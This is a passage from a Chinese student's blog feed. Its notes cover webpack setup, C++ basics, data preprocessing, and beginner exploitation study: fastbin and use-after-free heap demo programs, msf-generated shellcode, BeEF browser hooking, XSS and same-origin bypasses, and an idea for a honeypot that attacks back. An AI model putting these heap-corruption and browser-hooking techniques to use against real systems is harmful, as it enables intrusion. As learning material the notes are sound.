    loaders<span class="token punctuation">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">{</span>
        test<span class="token punctuation">:</span> <span class="token regex">/\.jsx?$/</span><span class="token punctuation">,</span>
        exclude<span class="token punctuation">:</span> <span class="token regex">/node_modules/</span><span class="token punctuation">,</span>
        loader<span class="token punctuation">:</span> <span class="token string">'babel-loader'</span><span class="token punctuation">,</span>
        query<span class="token punctuation">:</span> <span class="token punctuation">{</span>
          presets<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'es2015'</span><span class="token punctuation">,</span> <span class="token string">'react'</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些都配好以后只要 <code>webpack</code>一下就可以得到我们的<code>bundle</code>,在这里我跑了一下不知道为什么FF不可以,chrome是可以的</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Thinking]]></title>
      <url>/2017/06/26/Thinking/</url>
      <content type="html"><![CDATA[<p>要写点东西</p>
<ol>
<li><p>waf</p>
<ul>
<li>威胁感知部分(通过机器学习和大数据)<ul>
<li>自动抓取攻击向量</li>
<li>大数据</li>
<li>自学习</li>
</ul>
</li>
<li>处理目的是将hacker丢入蜜罐</li>
<li><p>WAF本身是通用型的，所以加入机器学习是一种趋势</p>
</li>
<li><p>将hacker丢入蜜罐是waf能完成的了得的吗啊啊啊诶</p>
</li>
</ul>
</li>
<li><p>蜜罐</p>
<ul>
<li>挂上beef</li>
<li>挂上其他的0day的洞</li>
<li>针对扫描器</li>
<li>针对sqlmap</li>
<li>整个一个生态圈</li>
</ul>
</li>
</ol>
<p>或者可以模仿beef</p>
<p>打AWVS的洞 <a href="http://www.91ri.org/14712.html" target="_blank" rel="external">http://www.91ri.org/14712.html</a></p>
<p><a href="http://www.freebuf.com/sectool/116706.html" target="_blank" rel="external">http://www.freebuf.com/sectool/116706.html</a><br><a href="http://www.freebuf.com/articles/network/116922.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/116922.html</a></p>
<p><a href="https://lightless.me/archives/docker-honeypot.html" target="_blank" rel="external">https://lightless.me/archives/docker-honeypot.html</a> (和我想实现的思路很像)<br>可以将hacker丢入蜜罐，然后使用扫描器和其他攻击工具的漏洞进行反击，再打回去</p>
<p>如何丢，应该就是有一个原始的模式库，再加上自学习(就是数据挖掘+人工智能)</p>
<p><a href="https://lightless.me/archives/kokkuri-s-revenge.html" target="_blank" rel="external">https://lightless.me/archives/kokkuri-s-revenge.html</a> </p>
<p>DNS rebinding可以用来打吗</p>
<p>之后真的真的想自己写一个出来</p>
<p>但好像涉及到机器学习就学要大量的资源来进行学习的样子是不是不适用于这种叫什么来着，这种实时的环境，好像可以使用map reduce</p>
<p>python mapReduce 利用mapReduce 的 Streaming</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[mark下最近看到的]]></title>
      <url>/2017/06/23/mark%E4%B8%8B%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/8347" target="_blank" rel="external">http://www.vuln.cn/8347</a> php一句话balabala</p>
<p><a href="http://www.sohu.com/a/116407354_421782" target="_blank" rel="external">http://www.sohu.com/a/116407354_421782</a> DDOS流量清理中心</p>
<p><a href="https://lightless.me/archives/docker-honeypot.html" target="_blank" rel="external">https://lightless.me/archives/docker-honeypot.html</a> docker蜜罐</p>
<p><a href="https://lightless.me/archives/kokkuri-s-revenge.html" target="_blank" rel="external">https://lightless.me/archives/kokkuri-s-revenge.html</a> 反击</p>
<p><a href="https://nota.moe/2016/special-comment-tokens-in-javascript/" target="_blank" rel="external">https://nota.moe/2016/special-comment-tokens-in-javascript/</a> 段子</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[数据预处理]]></title>
      <url>/2017/06/23/%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<h1 id="为什么进行"><a href="#为什么进行" class="headerlink" title="为什么进行"></a>为什么进行</h1><ul>
<li>缺失</li>
<li>噪声</li>
<li>不一致</li>
<li>维度太高 (这个算不算)</li>
</ul>
<h1 id="有这些方法"><a href="#有这些方法" class="headerlink" title="有这些方法"></a>有这些方法</h1><ul>
<li>数据集成(Data Integration), 多个数据源里的数据综合到一个一致的数据存储<ul>
<li>处理冗余数据</li>
<li>数据冲突</li>
</ul>
</li>
<li>数据清理(Data Cleaning)<ul>
<li>补充<code>缺失值</code><ul>
<li>均值</li>
<li>忽略</li>
<li>可能的值</li>
<li>…</li>
</ul>
</li>
<li>修正<code>不一致的数据</code></li>
<li>识别异常并平滑<code>噪音数据</code><ul>
<li>聚类</li>
<li>回归</li>
<li>分箱(Binning method)</li>
</ul>
</li>
</ul>
</li>
<li>数据变换(Data Transformation)</li>
<li>数据规约/简化(Data Reduction)<ul>
<li>获得原始数据集(超级大)的一个简约表示</li>
<li>容量上大大减少，但仍然接近原始数据的完整性并产生(基本)相同的分析结果</li>
<li>比如 维数规约 数值压缩</li>
</ul>
</li>
<li>数据融合(Data Fusion)</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wenku.baidu.com/view/438f85a2aa00b52acfc7caa0.html" target="_blank" rel="external">https://wenku.baidu.com/view/438f85a2aa00b52acfc7caa0.html</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[msf生成payload]]></title>
      <url>/2017/06/09/msf%E7%94%9F%E6%88%90payload/</url>
      <content type="html"><![CDATA[<p>经常看到别人pwn题解里的shellcode直接都是</p>
<pre class="line-numbers language-python"><code class="language-python">shellcode <span class="token operator">=</span> <span class="token string">""</span>
shellcode <span class="token operator">+=</span> <span class="token string">"some_binary_code"</span>
shellcode <span class="token operator">+=</span> <span class="token string">"some_binary_code"</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后还是想过他们是手敲上去的???</p>
<p>我的天,我真的是好蠢<br>后来发现好像是有两种方式</p>
<ol>
<li>有专门的网站可以搜</li>
<li>可以直接用msf生成一个 </li>
</ol>
<p>哦,这个是我在看这篇文章的时候发现的<br><a href="http://www.vuln.cn/6329" target="_blank" rel="external">http://www.vuln.cn/6329</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门6-heap]]></title>
      <url>/2017/06/09/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A86-heap/</url>
      <content type="html"><![CDATA[<p>转接<a href="/2017/05/16/堆溢出/">堆溢出</a></p>
<h2 id="继续学习"><a href="#继续学习" class="headerlink" title="继续学习"></a>继续学习</h2><h4 id="fastbin-amp-UAF"><a href="#fastbin-amp-UAF" class="headerlink" title="fastbin &amp; UAF"></a>fastbin &amp; UAF</h4><p>首先注意fast chunk的标志位<code>p</code>总是1的,所以没办法辨别某一块到底是不是在用,只能通过fd</p>
<p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> 这一片里面提到</p>
<blockquote>
<p>当然，在实际执行分配或回收时，还会对目标chunk的大小进行检查。但如果能够修改fd内容，那么在随后的malloc时便可能将修改后的地址返回，这进一步往往能够造成向任意地址写任意内容(write-anything-anywhere)的后果。<br>操作在于溢出,写到<code>fd</code>的内容,而漏洞发生在于,由于<code>fd</code>被改写,所以在<code>malloc</code>的时候可能会返回任意你想要的地址</p>
<pre class="line-numbers language-c"><code class="language-c">p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//这个p由于你前面改写`fd`,这个返回奇怪的地址,之后你对这个地址写就</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个文章前面其实说的很清楚,malloc两个chunk,后来的最为fastbin表里的index,当第二个chunk释放的时候,第二块chunk里的<code>fd</code>所指向的地方(正常情况下是第一块chunk的地址)会作为该fastbin的首块chunk的地址,如果我们能以某种方式改掉这个后来的这个块的fd到任意地址(通过堆溢出)那么我们在两次malloc,两次free(这前四次操作都是正常操作),再两次malloc,再进行最后一次malloc(第五次)就能获得任意地址,然后实现任意地址写,不知道理解对不对</p>
</blockquote>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">|</span> <span class="token number">0x1</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>buf0<span class="token punctuation">,</span> <span class="token operator">*</span>buf1<span class="token punctuation">,</span> <span class="token operator">*</span>buf2<span class="token punctuation">;</span>
    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">free</span><span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//注意这里先释放了buf1</span>
    <span class="token function">free</span><span class="token punctuation">(</span>buf0<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//这个时候两块chunk已经放到了fastbin里</span>
    buf0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//取走一块</span>

    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf0<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 利用取走的这块的写操作,这个地方改写到buf1的fd</span>
    buf1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    buf2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf2 is at %p\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a> (英文的,但好多人都推荐)<br><a href="http://blog.csdn.net/maokelong95/article/details/51989081" target="_blank" rel="external">http://blog.csdn.net/maokelong95/article/details/51989081</a> (上面那一篇的翻译版)<br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a> (这个是好像很不错的样子，已经star)</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门7-UAF]]></title>
      <url>/2017/06/09/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A87-UAF/</url>
      <content type="html"><![CDATA[<h2 id="hhh"><a href="#hhh" class="headerlink" title="hhh"></a>hhh</h2><p>很明显我还没学会</p>
<h2 id="只是在网上看到一个大佬写的"><a href="#只是在网上看到一个大佬写的" class="headerlink" title="只是在网上看到一个大佬写的"></a>只是在网上看到一个大佬写的</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> p1<span class="token punctuation">;</span>
    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr: %p, %s\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span> p2<span class="token punctuation">;</span>
    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr: %p, %s\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就是p1释放之后,p2申请同样大小的堆块的时候会把原来p1的那块给他<br>应该就是fastbin上分过来的吧</p>
<h2 id="又找到几篇文章"><a href="#又找到几篇文章" class="headerlink" title="又找到几篇文章"></a>又找到几篇文章</h2><p><a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">http://www.cnblogs.com/Ox9A82/p/5865420.html</a><br><a href="http://www.vuln.cn/6653" target="_blank" rel="external">http://www.vuln.cn/6653</a> (只想说这个,我没看懂)<br><a href="http://www.vuln.cn/6654" target="_blank" rel="external">http://www.vuln.cn/6654</a> (<a href="http://whereisk0shl.top/myarticle" target="_blank" rel="external">http://whereisk0shl.top/myarticle</a> 里提到的原来在wooyun的文章)</p>
<p>虽然没看懂,但几下关键词<code>fake chunk</code><br>他这个<code>pwn me</code>是<code>fastbin</code><br>对于free掉的<code>fastbin块</code>,原来data区域的开头的几个字节现在是放了<code>fd</code>指针<br>这道题目中这个<code>fd</code>的位置在还没有释放的时候存的是结构体的<code>rank</code>,所以要通过<code>rank</code>来泄露堆地址</p>
<p>后面的我是真的看不懂的了,我好菜啊==</p>
<h2 id="参考-还没看"><a href="#参考-还没看" class="headerlink" title="参考(还没看)"></a>参考(还没看)</h2><p><a href="http://www.freebuf.com/articles/web/69260.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69260.html</a><br><a href="http://bobao.360.cn/ctf/learning/149.html" target="_blank" rel="external">http://bobao.360.cn/ctf/learning/149.html</a><br><a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6175651.html</a></p>
<h2 id="还找到这样一个"><a href="#还找到这样一个" class="headerlink" title="还找到这样一个"></a>还找到这样一个</h2><p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门5-mmap mprotect]]></title>
      <url>/2017/06/08/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A85-mmap-mprotect/</url>
      <content type="html"><![CDATA[<h2 id="why"><a href="#why" class="headerlink" title="why"></a>why</h2><p>可以去绕过NX来跑shellcode</p>
<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://weeklyalgo.codes/2017/05/07/execute%20shellcode%20with%20mmap%20and%20mprotect/" target="_blank" rel="external">http://weeklyalgo.codes/2017/05/07/execute%20shellcode%20with%20mmap%20and%20mprotect/</a></li>
<li>蒸米的文章</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器篇]]></title>
      <url>/2017/06/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>在图书馆借到了<code>浏览器攻防指南:浏览器篇</code><br>答题浏览了一下,感觉好多关于浏览器的hack,比之前借的那本<code>白帽子讲浏览器感觉更深</code><br>这个作者好像是Beef的作者,于是装了个Beef,只要把hook.js丢到网站上面去就可以<code>hook</code>住访问网页的浏览器,然后弹个框啥的,不是说只能弹框,是我只会弹框,并且看了下居然没有人翻译过beef的文档</p>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>这一章主要回忆了一下几种xss:</p>
<ul>
<li>反射型</li>
<li>持久型</li>
<li>DOM型 这里提到DOM类是完全由前端造成的,主要是JavaScript<br>前两种可以认为是主要是服务器端造成的<br>后一种是客户端造成的(主要通过<code>#</code>)</li>
</ul>
<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p>讲到了一些JavaScript小strick<br>还提到了通过DNS,websocket等方法来持久化<br>前一段时间的cuit校赛就有一道<code>DNS</code>来绕过ip检查的,我其实并不太懂,还有好像记得<code>SQLi</code>也有<code>DNS</code>做带外通道的,啊,这一块完全是空白,我好菜咩,还有说到的<code>DNS预取</code><br>还有提到了一些跨域的策略,我只关注过那个<code>CORS</code>,还有其他的也不太会<br>提到了为了实现可持久化,<code>IFRAME</code>是首选</p>
<h2 id="第四章-绕过同源策略"><a href="#第四章-绕过同源策略" class="headerlink" title="第四章 绕过同源策略"></a>第四章 绕过同源策略</h2><p>这一章的内容应该算是我薄弱的地方了?之前看大佬的blog有花式绕过csp,学到了一点,这本书对于我来说还是挺不错的</p>
<h3 id="SOP"><a href="#SOP" class="headerlink" title="SOP"></a>SOP</h3><p>SOP 同源策略, 要主机名,协议,端口号都相同</p>
<p>有的时候我们要在同一根域名下不同主机间通信<br><code>store.xxx.com</code>可能要通过<code>login.xxx.com</code>来验证登录<br>这个时候可以使用这种操作<br>给两个子域都设置<code>document.domain = xxx.com</code>, 但注意这之后再改回<code>store.xxx.com</code>就会报错</p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>情景描述: 默认情况下,如果<code>*.xxx.com</code>使用XHR想不同来源比如<code>hacker.com</code>发送请求,那你就会读不到响应.但是请求还是会到达目标网站 (这个情景描述的很清楚,我喜欢)</p>
<p>解决方式就是在目标服务器<code>hacker.com</code>上返回下面的http响应头部</p>
<pre class="line-numbers language-http"><code class="language-http"><span class="token header-name keyword">Access-Control-Allow-Origin:</span> *.xxx.com
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这一章讲了许多针对性的<code>sop</code>绕过,比如针对各大浏览器(可能已经修复了),Flash,等等</p>
<p>然后讲了一下</p>
<ul>
<li>点击劫持(通常是透明的IFrame实现),可以绕过<code>CSRF token</code></li>
<li>光标劫持</li>
<li>文件劫持</li>
<li>等等…</li>
</ul>
<blockquote>
<p>CSRF token 即使能伪造一个表单,诱骗用户提交,但由于伪造不出来csrf token,所以攻击也会无效</p>
</blockquote>
<p>只是泛读了一下,和我想的不一样….</p>
<h2 id="第五章-攻击用户"><a href="#第五章-攻击用户" class="headerlink" title="第五章 攻击用户"></a>第五章 攻击用户</h2>]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C++ 面向对象 从入门到入门]]></title>
      <url>/2017/06/04/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>突然发现自己不会使用C++,所以要入门一下<br>因为是入门,所以可能有很多错误<br>先写概念,然后补上例子</p>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><blockquote>
<p>静态的成员变量属于类,也可以通过实例来调用,但静态可以直接使用ClassName::method()的方法就可以使用,就像是工具类,而静态的成员变量可以记录公共的信息,比如实例的个数<br>hack点: 静态成员变量使用前必须先初始化,后面我们会说怎么初始化,有两种方法,一种是c++ 11的新方法, 还有赋值与初始化的区别</p>
</blockquote>
<ul>
<li>静态成员函数中不能调用非静态成员,因为非静态的属于实例</li>
<li>非静态成员函数中可以调用静态成员,因为静态成员属于类</li>
</ul>
<h2 id="const-以后填坑"><a href="#const-以后填坑" class="headerlink" title="const (以后填坑)"></a>const (以后填坑)</h2><blockquote>
<p>在c++中const定义的变量一般是不分配内存的，和C语言中的#define。但是在c语言中const是默认分配的</p>
</blockquote>
<p>const 有顶层const,底层const<br>修饰指针变量的时候有<code>变量本身不可变</code>和<code>变量指向的内容不可变</code></p>
<h3 id="函数参数列表后-函数体前-这个位置加-const作用-然后填"><a href="#函数参数列表后-函数体前-这个位置加-const作用-然后填" class="headerlink" title="函数参数列表后 函数体前 这个位置加 const作用 (然后填)"></a>函数参数列表后 函数体前 这个位置加 const作用 (然后填)</h3><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><h2 id="构造函数-hack点"><a href="#构造函数-hack点" class="headerlink" title="构造函数 + hack点"></a>构造函数 + hack点</h2><p>这两种方式初始化有什么区别咩</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a is %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">int</span> a<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b is %d\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    A a1<span class="token punctuation">;</span>
    B b1<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个A和B中成员变量的初始化是不是没有区别啊,只是发现这个B中类内成员的这种初始化方法好像是<code>C++ 11</code>开始支持的<br>所以会报这个warning,然后我没加<code>std=c++11</code>,难道是编译器自己帮我加了?</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token number">15</span> col <span class="token number">17</span><span class="token operator">|</span> warning<span class="token operator">:</span> non<span class="token operator">-</span><span class="token keyword">static</span> data member initializers only available with <span class="token operator">-</span>std<span class="token operator">=</span>c<span class="token operator">++</span><span class="token number">11</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不过咩,注意以上两种都是初始化如果写成</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c is %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
        <span class="token keyword">int</span> c<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个就不是初始化了,这个c算是赋值,这里看起来没问题对吧,但在某些情况下有些成员变量就不能赋值,只能初始化(就是传说中的那种不能变的对象)比如</p>
<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span><span class="token operator">:</span>
        <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c is %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span><span class="token operator">:</span>
         <span class="token keyword">const</span> <span class="token keyword">int</span> c<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样做的话,就会报错</p>
<pre class="line-numbers language-cpp"><code class="language-cpp">error<span class="token operator">:</span> assignment of read<span class="token operator">-</span>only member ‘C<span class="token operator">::</span>c’
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>而必须采用上面A或者B的方法,看起来是A的方法兼容好一些,我以后就A这样子写吧<br>除了<code>const</code>外,<code>reference</code>也只能初始化,不能赋值.这也是指针和引用的有些不同</p>
<ul>
<li>引用必须被初始化,指针可以不</li>
<li>引用初始化后不能改变其值</li>
<li>不存在指向空值的引用</li>
</ul>
